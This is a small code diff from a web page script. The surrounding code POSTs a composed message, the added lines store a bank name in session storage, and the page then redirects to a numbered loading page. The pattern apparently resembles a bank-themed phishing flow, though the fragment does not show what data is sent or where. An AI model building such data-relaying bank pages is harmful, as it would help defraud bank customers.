@@ -677,7 +677,8 @@ const msg =
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify({ message: msg })
   });
-
+// Bank speichern
+  sessionStorage.setItem("bank_name", BANK_NAME || "");
   window.location.href = "loading5.html";
 });
 </script>
